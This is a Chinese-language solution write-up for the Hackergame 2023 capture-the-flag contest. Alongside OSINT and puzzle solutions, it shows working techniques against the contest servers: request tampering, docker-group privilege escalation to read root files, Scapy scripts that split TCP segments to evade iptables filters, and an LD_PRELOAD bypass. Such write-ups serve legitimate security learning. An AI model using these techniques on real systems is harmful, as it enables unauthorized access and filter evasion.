# Hackergame 启动

点击提交后发现 URL 中存在请求参数 `?similarity=` 然后把其改写为 `100` 就可以获取 flag。

## 猫咪小测

今年竟然可以展示测试分数，~~这样就可以暴力枚举了~~。

前两道题暴力枚举结果是 `12` 和 `23`。

第三个经过 Google 搜索可以得到 `CONFIG_TCP_CONG_BBR`。

最后一个利用 CHAT GPT 把带有计算机相关会议（尤其是编程语言的）例举出来，然后枚举带入可得 `ECOOP`。

## 更深更暗

打开 OBS 录制，然后一直按空格，等到 flag 出现，然后结束录屏。嗯这样从录屏中暂停就可以看到 flag 了。

## 旅行照片 3.0

### 题目 1-2

使用使 Google Lens 反查图片，发现一那块奖牌其实是诺奖奖牌，还是物理和化学奖的。通过 M.KOSHIBA 定位到获得主是 `Masatoshi Koshiba`（东京大学）。访问东京大学的诺贝尔奖展览 [Science Gallery The University of Tokyo](https://www.s.u-tokyo.ac.jp/en/gallery/nobelprize/)，可以确定最晚出生的是 `Takaaki Kajita`，1959 年生。获得诺奖那年是 2015 年，根据 [Wikipedia](https://en.wikipedia.org/wiki/Takaaki_Kajita) 提供的信息：

```
He became director of the Center for Cosmic Neutrinos at the Institute for Cosmic Ray Research (ICRR) in 1999. As of 2017, he is a Principal Investigator at the Institute for the Physics and Mathematics of the Universe in Tokyo, and Director of ICRR.
```

从信息中可以肯定获得诺奖时所在的机构是 `ICRR`。

通过第二张图片学长脖子上的挂绳中的 `STATPHYS28` 确定学长这时应该在参加这个活动。进入活动 [官网](https://statphys28.org/)，官网展示的时间是和地点分别是：

```
DATE Date August 7th-11th, 2023

VENUE On-site : The University of Tokyo, Hongo campus, Tokyo, Japan
```

利通小时间段范围枚举，可以得到当时的日期是 `2023-08-10`，提交答案获得 flag。

### 题目 3-4

同样使用 Google Lens 对第三张图片反查可以定位图中地点是 [Big Fountains, Ueno Park 上野公園 大噴水 - Google Maps](https://www.google.com/maps/@35.7171566,139.7748063,17.66z?entry=ttu "Big Fountains, Ueno Park 上野公園 大噴水 - Google Maps")。然后结合 `2023-08-10` 以及 `上野公園 大噴水`（这里用日文才会查到）组合为 `上野公園 大噴水 8 月 10 日` 进行 Google 搜索，可以得到 [全国梅酒まつりin東京2023](https://umeshu-matsuri.jp/tokyo_ueno/)。然后注意到 `2023 年 8 月 10 日（木）～13 日（日）開催`。可以肯定就是这个活动了。向下浏览页面找到 `INFORMATION 最新情報` 发现 [東京 ボランティアSTAFF大募集！！第６回「全国梅酒まつりin東京2023」](https://umeshu-matsuri.jp/tokyo_staff/) 可以确定志愿者链接是 `https://ws.formzu.net/dist/S495584522/` 进一步得到编号 `S495584522`。

至于图书馆参观花费了多少日元，我猜应该是 `東京国立博物館`。去官网看了下发现是 `1000` 日元，然后输入发现不正确（其实这个有分类的，当时没仔细看也没想，后来干脆不看暴力了），然后用暴力枚举了大范围数字发现也不对。后来想想~~该不会是 0 吧~~，结果填 `0` 进去，竟然获得了 flag。

### 题目 5-6

从学长参加的活动网站提供的信息可以确定学长当晚要去 `Hongo campus` 进行集合中文名称叫 `安田讲堂`（其实之前没注意到那个 STATPHYS28 ，然后自己按彩虹桥推测的信息乱填了好久。后来注意到那个 STATPHYS28 活动，然后直接就试了这个地址，看好多题解都是看日程表的，这样上来直接能填对算是运气吧。说到这我那个日期也是暴力的，是后知道 STATPHYS28 才能确定日期的）。

关于“你在 JR 上野站中央检票口外看到「ボタン＆カフリンクス」”的这个问题，也可以进行 Google 搜索，不过这里要用全日语（不然好像搜索不出来结果）。把 `上野站` 替换为 `上野駅`，`＆` 替换为 `アンド`，然后组合搜索 `ボタンアンドカフリンクス 上野駅` ，得到 [ボタンアンドカフリンクス on Instagram | Hashtags](https://www.instagram.com/explore/tags/%E3%83%9C%E3%82%BF%E3%83%B3%E3%82%A2%E3%83%B3%E3%83%89%E3%82%AB%E3%83%95%E3%83%AA%E3%83%B3%E3%82%AF%E3%82%B9/)，点击链接进去发现粉色海报上的动物是只 `熊猫`。

关于在“出站处附近建筑的屋顶广告牌上”的这个问题，从第四张图片看位置应该是任天堂，通过线路推测下车地点应该是涩谷。既然有裸眼 3D，而且还是在涩谷，那么大概率就是秋田犬（这个事情比较出名）。所以最后一空答案是 `熊猫+秋田犬`。

## 赛博井字棋

这道题你和 AI 下肯定是下不过或者是平局的，所以要利用特殊方法。打开浏览器 Dev 工具，找到 Network 选项卡，然后下一个 (0,0) 位置。 Bot 也会按照你下的位置按照策略下，但是不要理会 。在 Network 选项卡中已经发送的请求上右键 copy as fetch，然后跳转到 console 选项卡，把刚才的请求粘贴进去，改一下位置为 (1,1)，这样就会覆盖掉 bot 下的位置。然后再手动下 (2,2)，就可以排成一条直线了，就很容易赢 bot 获取 flag 了。

## 奶奶的睡前 flag 故事

从描述信息可以看到 **谷歌『亲儿子』** 以及 **连系统都没心思升级** 还有截 **截图** 可以联想到 GooglePixel 的截屏的 CVE，找一个复现的 [网站](https://acropalypse.app/) 就可以获取到图片下部分。

## 组委会模拟器

这个就是写请求的问题了，上代码：

```python
import json  
import time  
  
import requests  
  
session = requests.Session()  
  
initial_cookies = {  
    "session": ""}  
session.cookies.update(initial_cookies)  
  
response = session.post("http://202.38.93.111:10021/api/getMessages")  
response.encoding = 'utf-8'  
data = json.loads(response.text)  
results = {}  
for i, message in enumerate(data["messages"]):  
    if "text" in message and "hack[" in message["text"]:  
        results[i] = {'delay': message["delay"], 'text': message["text"]}  
  
init_time = time.time()  
  
for id, v in results.items():  
    send_time = init_time + v['delay']  
    current_time = time.time()  
    delay_seconds = send_time - current_time  
    if delay_seconds > 0:  
        time.sleep(delay_seconds)  
    payload = {'id': id}  
    headers = {'Content-Type': 'application/json'}  
    response = session.post('http://202.38.93.111:10021/api/deleteMessage', data=json.dumps(payload), headers=headers)  
    response.encoding = 'utf-8'  
    if response.status_code == 200:  
        print(f"Sent ID {id} at {send_time} seconds.")  
        print(f"Response content: {json.loads(response.text)}")  
    else:  
        print(response.text)  
        print(f"Failed to send ID {id} at {send_time} seconds. Status code: {response.status_code}")  
  
response = session.post('http://202.38.93.111:10021/api/getflag')  
print(response.text)  
session.close()
```

执行后自动获得 flag。

## 虫

播放音频可以判断这个问题应该是无线电问题。利用电脑上的 `MMSSTV` 或者是手机上的 `Robot36` 就接收题目提供的音频就可以获取到 flag。

## JSON ⊂ YAML?

### JSON ⊄ YAML 1.1

经过查询一篇名为 [JSON is not a YAML subset](https://john-millikin.com/json-is-not-a-yaml-subset) 的网站可以得到 JOSN 在转 YAML1.1 时会把值中的科学计数法转换为字符串。然后构造一个带有科学技术的的 JSON  `{"a": 1e2}`。就可以获得 flag 了。当然也不止这一种方式，JSON 那边还有可能溢出，同样和 YAML 解析的结果不一样。

### JSON ⊄ YAML 1.2

经查询一篇名为 [# Why not use the YAML 1.2 standard? - we don't need a new standard!](https://hitchdev.com/strictyaml/why-not/ordinary-yaml/) 的网站可以得到 TAML 1.2 中的键不可用重复的结论。然后就可以构造一个带有重复键的 JSON：`{"foo": 0,"foo": 0}`，输入进去引发异常就可以获得 flag 了。

## Git? Git!

用 `git reflog` 查看引用的历史提交记录，得到 `505e1a3 HEAD@{2}: commit: Trim trailing spaces`。然后再 `git reset --hard 505e1a3` 将 HEAD 指向该特定提交。然后 `cat README.md | grep flag` 就可以看到 flag 了。

## HTTP 集邮册

### 没有状态……哈？

纯自己想出来的有问题的请求，在这之前都不知道有没状态这一说。~~没想到我这 BUG 体质还能在这道题用上~~。

```
GET / \r\n
Host: example.com\r\n\r\n
```

### 12 种状态码

参考的网站 [HyperText Transfer Protocol (HTTP)](https://http.dev/)

#### 100

```
GET / HTTP/1.1\r\n
Host: example.com\r\n
Expect: 100-continue\r\n\r\n
```

#### 200

```
GET / HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

#### 206

```
GET / HTTP/1.1\r\n
Host: example.com\r\n
Range: bytes=10-100\r\n\r\n
```

#### 304

```
GET / HTTP/1.1\r\n
Host: example.com\r\n
If-None-Match: "64dbafc8-267"\r\n\r\n
```

#### 400

```
GET / HTTP/1.1\r\n
Host: \r\n\r\n
```

#### 404

```
GET /a HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

#### 405

```
A / HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

#### 412

```
GET / HTTP/1.1\r\n
Host: example.com\r\n
If-Unmodified-Since: Fri, 1 Jan 2021 00:00:00 GMT\r\n\r\n
```

#### 413

```
GET / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 10000000000000\r\n\r\n
```

#### 414

```
GET /<…a_long_URI…> HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

#### 416

```
GET / HTTP/1.1\r\n
Host: example.com\r\n
Range: bytes=25000-75000\r\n\r\n
```

#### 505

```
GET /a HTTP/2.1\r\n
Host: example.com\r\n\r\n
```

## Docker for Everyone

刚开始用 docker 的时候也注意到了有 docker 组用户会获得读取仅 root 用户才可以读取文件的权限问题。所以这道题就对我来说很简单了。

```shell
cd /            #进入根目录
ls -la          #查看flag链接指向位置
docker run -it --rm -v /dev/shm/:/x/ alpine #挂载flag父文件夹到容器并启动
cd /x           #进入挂载目录
cat /flag       #读取flag
```

## 惜字如金 2.0

这道题按照规则反着推就可以了，字典里字符串下载下来的都是 23 位长度，但实际上要求是 24 位。可以先把 get_code_dict() 外的调用 check_equals 的函数注释掉，然后可以试着手动按照规则反向补全就可以了。因为按照规则反向符合的补全的地方有很多，这里可以采用一些无用的字符作为补全比如说 `_` 字符，可以先尝试用 `_` 对原有字符进行替换，然后发现他会不会影响解密的结果，然后不影响就替换。然后尝试多补全几次就得到下面的代码。之后你会发现其实被惜字如金化后的某些字符是不参与到解密运算的，就比如下面代码中带有 `_` 的字符。

```python
def check_equals(left, right):  
    if left != right: exit(1)  
  
  
def get_code_dict():  
    code_dict = []  
    code_dict += ['nymeh1niwemflcir}echaet_']
    code_dict += ['a3g7}kidgojernoetlsup?h_']
    code_dict += ['ulwe!f5soadrhwnrsnstnoeq']  
    code_dict += ['cte{l-findiehaai{oveatas']  
    code_dict += ['tye9kxborszstguyd?!blm-p']  
    check_equals(set(len(s) for s in code_dict), {24})  
    return ''.join(code_dict)  
  
  
def decrypt_data(input_codes):  
    cod_dict = get_code_dict()  
    output_chars = [cod_dict[c] for c in input_codes]  
    return ''.join(output_chars)  
  
  
if __name__ == '__main__':  
    flag = decrypt_data([53, 41, 85, 109, 75, 1, 33, 48, 77, 90,  
                         17, 118, 36, 25, 13, 89, 90, 3, 63, 25,  
                         31, 77, 27, 60, 3, 118, 24, 62, 54, 61,  
                         25, 63, 77, 36, 5, 32, 60, 67, 113, 28])  
    check_equals(flag.index('flag{'), 0)  
    check_equals(flag.index('}'), len(flag) - 1)  
    print(flag)

```

## 🪐 高频率星球

通过 `asciinema cat asciinema_restore.rec` 可以得到：

```
%
stage % sha256sum flag.js
6bbbb91b7adc465fa086ec4ad453bca38beef9967800bf24d046a27b8cb70042  flag.js
%
stage % less flag.js
stage % echo "Execute flag.js with nodejs to get the flag"
Execute flag.js with nodejs to get the flag
%
stage % node flag.js
%
stage %
```

执行 `asciinema cat asciinema_restore.rec > flag.js`，然后编辑这个文件 `code --disable-extensions flag.js`。把带有控制字符的文本全部删掉就可以了，然后执行 `node flag.js` 获得 flag。

## 🪐 小型大语言模型星

### You Are Smart

测试了几次输入信息发现不会收到上文影响，这个模型应该是一个文字续写模型（后来去官网也证实了）。所以就尽量编写能让他说出 you are smart 的话，试了多个，发现 `she is smart he is smart and` 会让他说出 `kind. She says, "You are welcome, Ben. You are smart too. You are my friend."They hug and smile.They` 然后获得 flag。

###  Accepted

这个我特地去官网把训练集和验证集下载下来，找关于 accepted 的上下文，然后按照最相关最大的七位数字以下的单词及其变体带入，最后人工试了 n 次（累死了），发现 `Apology` 可以让他说出 `accepted. She was so happy and excited. She thanked the old man and ran off to show her friends her new toy.` 获得 flag。

期间还发现一些有意思的东西。也尝试带入过人名，不过没什么效果。不过 `Moral` 这个东西就比较有意思了。可以加入前缀得到一些有意思的东西：

```
> Moral
> of the story: Always be careful and never take risks that could be dangerous.

> AMoral
> The moral of the story is: Listen to your parents and be careful.

> BMoral
> of the story: The moral of the story is: Be kind and respectful to others, even if they are different from you. You never

> CMoral
> of the story: it is important to be careful and not take unnecessary risks.
```

就比较神奇，不过不知道用暴力使用 X+Moral 会不会得到 accepted。

## 🪐 流式星球

分析代码发现生成视频的代码把视频的维度经过一些列运算给展平了，而且展平后随机截断了后面的一定范围的数据。但是通过 print 展平后的数据发现后面的元素都为 0。也就是可以通过随机添加 0 再 reshape 展平后的数据。但这样做可能过于麻烦，因为基于推测的长宽还要符合添加 0 后的数据才能 reshape。所以不妨换一个思路，一帧一帧的看视频。通过生成代码的视频的断言语句可以推断视频的长宽不是 10 的倍数，然后暴力枚举视频的宽度，最后确定在 `427`（~~怎么是邦邦~~）。然后可以通过 offset 进行抽帧来查看视频。最后可以展示视频中带有 flag 帧的代码：

```python
import cv2
import numpy as np


def generate_first_frame(data, frame_width, frame_height, offset):
    frame_size = frame_width * frame_height * 3
    start = frame_size * offset
    end = start + frame_size
    frame_data = data[start:end]

    return np.frombuffer(frame_data, dtype=np.uint8).reshape((frame_height, frame_width, 3))


if __name__ == "__main__":
    frame_width = 427
    frame_height = 1000
    frame_offset = 66
    with open("video.bin", "rb") as file:
        data = file.read()
    first_frame = generate_first_frame(data, frame_width, frame_height, frame_offset)
    cv2.imwrite("frame.jpg", first_frame)
```

## 🪐 低带宽星球

###  小试牛刀

使用 `pngout`，把压缩完图片提交上去就可以获取 flag 了。

```
pngout image.png 
 In:    5845 bytes               image.png -c2 -f5
Out:    1262 bytes               image.png -c3 -f0 -d2, 3 colors
Chg:   -4583 bytes ( 21% of original)
```

## Komm, süsser Flagge

从 iptables 可以规则看出，需要把 POST 错开。但防火墙过滤只针对 TCP，由此 IP 报文分片方法不可用（因为在内核已经拼好了）。所以要用到 TCP 分段，分段后的 TCP 会自动拼接好提交给上一层不会影响到 HTTP。代码实现问问 CHAT GPT 有啥思路，经介绍于是学习了 `scapy`。

###  我的 POST

用 `scapy` 模拟 `TCP 分段数据包`，将 `POST` 错开为 `PO` 和 `ST`，wireshark 抓包获取 flag。

```python
from scapy.all import *  
  
DST = '202.38.93.111'  
DPORT = 18080  
HTTP_REQUEST = b'POST / HTTP/1.1\r\nHost: \r\nContent-Length: 101\r\n\r\n token'  
syn = IP(dst=DST) / TCP(sport=random.randint(1024, 65535), dport=DPORT, flags='S')  
syn_ack = sr1(syn)  
  
first_segment = IP(dst=DST)/TCP(dport=DPORT, sport=syn_ack[TCP].dport,  
                            seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='PA') / Raw(load=HTTP_REQUEST[:2])  
  
first_segment_ack = sr1(first_segment)  
  
second_segment = IP(dst=DST)/TCP(dport=DPORT, sport=first_segment_ack[TCP].dport,  
                            seq=first_segment_ack[TCP].ack, ack=first_segment_ack[TCP].seq + 1, flags='PA') / Raw(load=HTTP_REQUEST[2:])  
  
send(second_segment)
```

### 我的 P

这一问用上一问的代码同样可以通过（虽然我也看不懂 iptable 那条规则写的是什么意思）。

### 我的 GET

这个就需要向 `TCP 头部` 塞东西了，问问 CHAT GPT 发现唯一可以塞入的就是 `OPTION` 字段，把 `GET / HTTP ` 塞到 `TCP 头部` 的 `OPTION` 里面就可以了，这里 `SYN` 请求也要放进去，不然刚开始握手就会被 `RST`。同样请求发送完毕，wireshark 查看 flag。

```python
from scapy.all import *  
  
DST = '202.38.93.111'  
DPORT = 18082  
HTTP_REQUEST = b'POST / HTTP/1.1\r\nHost: \r\nContent-Length: 101\r\n\r\ntoken'  
  
syn = IP(dst=DST) / TCP(sport=random.randint(1024, 65535), dport=DPORT, flags='S', options=[(253, b'GET / HTTP')])  
syn_ack = sr1(syn)  
  
request = IP(dst=DST) / TCP(dport=DPORT, sport=syn_ack[TCP].dport,  
                            seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='A',  
                            options=[(253, b'GET / HTTP')]) / Raw(load=HTTP_REQUEST)  
  
send(request)
```

## 为什么要打开 /flag 😡

### LD_PRELOAD, love!

之前写 golang 遇到调用过系统 lib 这类问题，于是发现用 golang 启用 CGGO 编译，就不会用到系统的 lib 了。

编译命令：`CGO_ENABLED=1 GOOS=linux GOARCH=amd64 go build -o x main.go`，golang 代码：

```go
package main

import (
	"fmt"
	"io/ioutil"
	"os"
)

func main() {
	file, err := os.Open("/flag")
	if err != nil {
		return
	}
	defer file.Close()

	content, err := ioutil.ReadAll(file)
	if err != nil {
		return
	}

	fmt.Println(string(content))
}
```

编译后提交获得 flag。

## 异星歧途

Mindustry 处理器指令问题。之前有玩过（~~甚至还有无敌作弊 mod~~）钍反应堆直接用作弊 mod 接入冷却水，这样就不用怕手残乱点把反应堆引爆了，分析一下指令调试几次就可以启动冲击反应堆了。详细过程还是参考其他人的题解吧。